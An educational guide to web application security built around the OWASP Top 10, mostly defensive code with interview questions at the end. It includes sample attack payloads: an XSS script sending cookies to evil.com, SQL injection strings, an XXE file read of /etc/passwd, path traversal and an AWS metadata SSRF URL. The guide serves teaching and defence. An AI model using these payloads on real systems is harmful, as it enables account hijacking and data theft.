# Web Security

## Overview

Web security encompasses the practices and techniques used to protect web applications from attacks. The OWASP (Open Web Application Security Project) Top 10 is the standard awareness document for web application security, representing the most critical security risks.

## OWASP Top 10 (2021)

```
┌─────────────────────────────────────────────┐
│           OWASP Top 10 - 2021               │
├─────┬───────────────────────────────────────┤
│  A01│ Broken Access Control                  │
│  A02│ Cryptographic Failures                 │
│  A03│ Injection                              │
│  A04│ Insecure Design                        │
│  A05│ Security Misconfiguration              │
│  A06│ Vulnerable Components                  │
│  A07│ Auth Failures                          │
│  A08│ Software & Data Integrity              │
│  A09│ Logging & Monitoring Failures          │
│  A10│ Server-Side Request Forgery (SSRF)     │
└─────┴───────────────────────────────────────┘
```

## Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of XSS

```
┌─────────────────────────────────────────────┐
│              Types of XSS                    │
├─────────────┬───────────────────────────────┤
│ Stored XSS  │ Malicious script stored in DB │
│             │ Affects all users viewing page │
├─────────────┼───────────────────────────────┤
│ Reflected   │ Script in URL/query parameter │
│ XSS         │ Reflected back in response    │
├─────────────┼───────────────────────────────┤
│ DOM-based   │ Manipulation of DOM in client │
│ XSS         │ Never sent to server          │
└─────────────┴───────────────────────────────┘
```

### Stored XSS Attack

```
Attacker posts comment:
  <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

Server stores this in database.

When other users view the page:
  ┌────────┐     ┌────────┐     ┌────────┐
  │ Attacker│     │ Server │     │ Victim │
  └────┬───┘     └────┬───┘     └────┬───┘
       │              │              │
       │ Posts evil   │              │
       │ comment      │              │
       │─────────────▶│              │
       │              │              │
       │              │ Serves page  │
       │              │ with evil JS │
       │              │─────────────▶│
       │              │              │
       │              │    Victim's cookie
       │◀─────────────┼──────────────│
       │    sent to attacker          │
```

### XSS Prevention

```python
# Python - HTML Escaping
import html

def render_comment(comment):
    # Escape all HTML special characters
    safe = html.escape(comment)
    return f"<div class='comment'>{safe}</div>"

# Flask/Jinja2 auto-escapes by default
# {{ user_input }}  ← automatically escaped
# {{ user_input | safe }}  ← explicitly unsafe, avoid

# Content Security Policy header
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{random}'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "
        "base-uri 'self';"
    )
    return response
```

```javascript
// JavaScript - DOM XSS Prevention
// BAD: Using innerHTML with user input
element.innerHTML = userInput;

// GOOD: Using textContent
element.textContent = userInput;

// BAD: Using eval
eval(userInput);

// GOOD: Using JSON.parse
const data = JSON.parse(userInput);

// Sanitizing HTML (when you need to allow some HTML)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHTML);
```

## SQL Injection

SQL injection allows attackers to execute arbitrary SQL commands through user input.

### Attack Patterns

```sql
-- Normal login query
SELECT * FROM users WHERE username='alice' AND password='secret123'

-- Attack: ' OR '1'='1' --
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'

-- Attack: UNION-based extraction
' UNION SELECT username, password FROM users --

-- Attack: Blind SQL injection (boolean-based)
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') > 0 --

-- Attack: Time-based blind
'; WAITFOR DELAY '0:0:5' --
```

### SQL Injection Prevention

```python
# BAD: String concatenation (vulnerable)
def get_user_unsafe(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# GOOD: Parameterized queries
def get_user_safe(username):
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))

# GOOD: ORM (SQLAlchemy)
def get_user_orm(username):
    return User.query.filter_by(username=username).first()

# GOOD: Query builder with parameterization
def search_products(category, min_price):
    query = """
        SELECT * FROM products 
        WHERE category = %s AND price >= %s
        ORDER BY name
    """
    return db.execute(query, (category, min_price))
```

```java
// Java - PreparedStatement
// BAD
String query = "SELECT * FROM users WHERE name = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// GOOD
String query = "SELECT * FROM users WHERE name = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

### Stored Procedure Protection

```sql
-- Stored procedures with parameterized inputs
CREATE PROCEDURE GetUserByName(@Username NVARCHAR(50))
AS
BEGIN
    SELECT Id, Username, Email 
    FROM Users 
    WHERE Username = @Username
END

-- Execute safely
EXEC GetUserByName @Username = 'alice'
```

## Cross-Site Request Forgery (CSRF)

CSRF tricks authenticated users into performing unwanted actions.

### Attack Flow

```
┌────────┐         ┌────────┐         ┌────────┐
│ Attacker│         │ Victim │         │ Bank   │
│  Site   │         │ Browser│         │  App   │
└────┬───┘         └────┬───┘         └────┬───┘
     │                  │                  │
     │ Victim visits    │                  │
     │ attacker site    │                  │
     │◀─────────────────│                  │
     │                  │                  │
     │ Hidden form      │                  │
     │ auto-submits     │                  │
     │─────────────────▶│                  │
     │                  │                  │
     │                  │ Transfer $1000   │
     │                  │ (with victim's   │
     │                  │  session cookie) │
     │                  │─────────────────▶│
     │                  │                  │
     │                  │ Transfer executes│
     │                  │◀─────────────────│
```

### CSRF Prevention

```python
# Flask - CSRF protection with Flask-WTF
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# Generate CSRF token
@app.route('/form')
def form():
    return render_template('form.html', csrf_token=generate_csrf())

# HTML template
# <form method="POST" action="/transfer">
#     <input type="hidden" name="csrf_token" value="{{ csrf_token }}"/>
#     <input type="text" name="amount"/>
#     <button type="submit">Transfer</button>
# </form>
```

```python
# Django - Built-in CSRF protection
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def transfer_money(request):
    if request.method == 'POST':
        amount = request.POST.get('amount')
        # Django automatically validates CSRF token
        process_transfer(request.user, amount)
```

```javascript
// Double Submit Cookie pattern
// Server sets CSRF cookie
document.cookie = "csrf_token=abc123; SameSite=Strict; Secure";

// Client includes token in request header
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': getCookie('csrf_token')
    },
    body: JSON.stringify({ amount: 1000 })
});
```

**Key CSRF defenses**:
- Synchronizer token pattern (most common)
- Double submit cookie
- SameSite cookie attribute (`Strict` or `Lax`)
- Check `Origin` / `Referer` headers
- Require re-authentication for sensitive actions

## Server-Side Request Forgery (SSRF)

SSRF allows attackers to make the server send requests to unintended locations.

### Attack Scenarios

```
┌──────────┐     ┌──────────┐     ┌─────────────┐
│ Attacker │────▶│  Server  │────▶│ Internal    │
│          │     │          │     │ Services    │
│          │     │ URL fetch│     │ (metadata,  │
│          │     │ feature  │     │  databases) │
└──────────┘     └──────────┘     └─────────────┘

Attacker sends: url=http://169.254.169.254/latest/meta-data/
Server fetches AWS metadata (credentials, tokens)
```

### SSRF Prevention

```python
from urllib.parse import urlparse
import ipaddress
import socket

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (AWS metadata)
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('::1/128'),
]

def is_safe_url(url):
    """Validate URL for SSRF prevention."""
    parsed = urlparse(url)
    
    # Only allow HTTP/HTTPS
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # Resolve hostname to IP
    try:
        hostname = parsed.hostname
        ip = socket.gethostbyname(hostname)
        ip_addr = ipaddress.ip_address(ip)
    except (socket.gaierror, ValueError):
        return False
    
    # Block internal/private IPs
    for network in BLOCKED_NETWORKS:
        if ip_addr in network:
            return False
    
    # Block redirects to internal IPs (check final URL)
    return True

@app.route('/fetch-url')
def fetch_url():
    url = request.args.get('url')
    
    if not is_safe_url(url):
        return 'Invalid URL', 400
    
    # Use allow-list of domains if possible
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        return 'Domain not allowed', 403
    
    response = requests.get(url, timeout=5, allow_redirects=False)
    return response.text
```

## XML External Entity (XXE)

XXE exploits XML parsers that process external entity references.

### Attack Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```

### XXE Prevention

```python
from lxml import etree

# Disable external entity processing
parser = etree.XMLParser(
    no_network=True,
    resolve_entities=False,
    dtd_validation=False,
    load_dtd=False
)

# Parse safely
tree = etree.fromstring(xml_data, parser=parser)

# Better: Use defusedxml
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_data)
```

```java
// Java - Disable DTD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## Path Traversal

Path traversal allows attackers to access files outside the intended directory.

### Attack Pattern

```
Intended:  /app/uploads/user_photo.jpg
Attack:    /app/uploads/../../../etc/passwd
Encoded:   /app/uploads/..%2F..%2F..%2Fetc%2Fpasswd
```

### Prevention

```python
import os

def safe_file_path(base_dir, user_filename):
    """Prevent path traversal attacks."""
    # Remove directory separators and null bytes
    filename = os.path.basename(user_filename)
    filename = filename.replace('\x00', '')
    
    # Construct full path
    full_path = os.path.normpath(os.path.join(base_dir, filename))
    
    # Verify the path is within the base directory
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise ValueError("Invalid filename")
    
    return full_path

# Usage
@app.route('/download/<filename>')
def download(filename):
    safe_path = safe_file_path('/app/uploads', filename)
    return send_file(safe_path)
```

## Insecure Deserialization

Untrusted deserialization can lead to remote code execution.

### Prevention

```python
import json

# GOOD: Use JSON (doesn't execute code)
data = json.loads(user_input)

# BAD: Never use pickle with untrusted data
import pickle
data = pickle.loads(user_input)  # Can execute arbitrary code!

# GOOD: Use safe serialization formats
# JSON, Protocol Buffers, MessagePack (with type restrictions)

# If you must use YAML:
import yaml
# BAD: yaml.load() can execute arbitrary Python
# GOOD: yaml.safe_load() only processes basic types
data = yaml.safe_load(user_input)
```

## Security Headers

```python
@app.after_request
def security_headers(response):
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    
    # Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # XSS protection (legacy browsers)
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Strict Transport Security (HTTPS only)
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    # Referrer policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # Permissions policy
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    
    return response
```

## Rate Limiting

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379"
)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Prevents brute force attacks
    return authenticate(request.json)

@app.route('/api/search')
@limiter.limit("30 per minute")
def search():
    return perform_search(request.args)
```

## Input Validation

```python
from pydantic import BaseModel, validator, constr, conint
from typing import Optional

class UserRegistration(BaseModel):
    username: constr(min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    age: conint(ge=13, le=120)
    password: constr(min_length=12, max_length=128)
    bio: Optional[constr(max_length=500)] = None
    
    @validator('password')
    def password_strength(cls, v):
        if not any(c.isupper() for c in v):
            raise ValueError('Must contain uppercase')
        if not any(c.islower() for c in v):
            raise ValueError('Must contain lowercase')
        if not any(c.isdigit() for c in v):
            raise ValueError('Must contain digit')
        return v

@app.route('/register', methods=['POST'])
def register():
    try:
        data = UserRegistration(**request.json)
    except ValidationError as e:
        return jsonify({'errors': e.errors()}), 400
    
    create_user(data.dict())
    return jsonify({'message': 'Created'}), 201
```

## Interview Questions

### Q1: Explain the difference between XSS and CSRF.

**Answer**: XSS injects malicious scripts into a website that execute in victims' browsers, stealing data like cookies. CSRF tricks an authenticated user's browser into making unwanted requests to a site they're logged into. XSS exploits trust in a website; CSRF exploits trust a website has in a user's browser. XSS prevention: output encoding, CSP. CSRF prevention: tokens, SameSite cookies.

### Q2: How does parameterized queries prevent SQL injection?

**Answer**: Parameterized queries separate SQL code from data. The database treats user input as literal values, not executable SQL. The query structure is pre-compiled with placeholders, and parameters are bound separately. Even if input contains SQL syntax, it's treated as a string value, not code.

### Q3: What is the SameSite cookie attribute and how does it help?

**Answer**: SameSite controls when cookies are sent with cross-site requests. `Strict`: never sent cross-site. `Lex`: sent with top-level navigations but not cross-site POST requests (default in modern browsers). `None`: always sent (requires Secure flag). This prevents CSRF by blocking cookies from being sent with forged cross-site requests.

### Q4: How would you secure a file upload feature?

**Answer**: Validate file type (check magic bytes, not just extension), limit file size, store outside web root, rename files randomly, scan for malware, set proper Content-Type headers, use Content-Disposition: attachment, validate image dimensions (prevent image-based attacks), use a CDN/object storage for serving files.

### Q5: What is Content Security Policy (CSP)?

**Answer**: CSP is an HTTP header that controls which resources (scripts, styles, images) a browser is allowed to load. It prevents XSS by restricting inline scripts and unauthorized external sources. Example: `script-src 'self' https://cdn.example.com` only allows scripts from the same origin and a specific CDN. Nonce-based CSP is the modern approach for allowing specific inline scripts.

### Q6: Explain timing attacks and how to prevent them.

**Answer**: Timing attacks exploit differences in response time to infer information (e.g., comparing password hashes byte-by-byte). Prevention: use constant-time comparison functions like `hmac.compare_digest()` or `crypto.timingSafeEqual()`. These functions always compare all bytes regardless of where differences occur.
